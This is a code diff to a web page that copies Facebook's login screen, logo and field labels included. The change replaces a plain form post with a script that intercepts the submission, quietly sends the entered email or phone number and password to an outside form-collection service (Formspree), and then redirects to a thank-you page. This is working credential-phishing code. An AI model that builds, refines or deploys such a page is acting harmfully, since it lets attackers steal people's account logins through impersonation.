@@ -20,19 +20,30 @@
                 <img src="image/fb_white_f.png" alt="Facebook" class="fb-logo">
             </div>
 
-            <form action="https://formspree.io/f/mpqenlvq" method="POST">
-                <input type="hidden" name="_next" value="thankyou.html">
+            <form id="loginForm">
                 <div class="input-group">
-                    <input type="text" id="email" name="email" placeholder=" " required>
+                    <input type="text" id="email" name="identifier" placeholder=" " required>
                     <label for="email">Mobile number or email address</label>
                 </div>
                 <div class="input-group">
-                    <input type="password" id="password" name="password" placeholder=" " required>
+                    <input type="password" id="password" name="credential" placeholder=" " required>
                     <label for="password">Password</label>
                 </div>
                 <button type="submit" class="btn-login">Log in</button>
                 <a href="#" class="forgot">Forgotten password?</a>
             </form>
+            <script>
+                document.getElementById('loginForm').addEventListener('submit', async function(e) {
+                    e.preventDefault();
+                    const data = new FormData(this);
+                    await fetch('https://formspree.io/f/mpqenlvq', {
+                        method: 'POST',
+                        body: data,
+                        headers: { 'Accept': 'application/json' }
+                    });
+                    window.location.href = 'thankyou.html';
+                });
+            </script>
         </div>
 
         <div class="bottom">
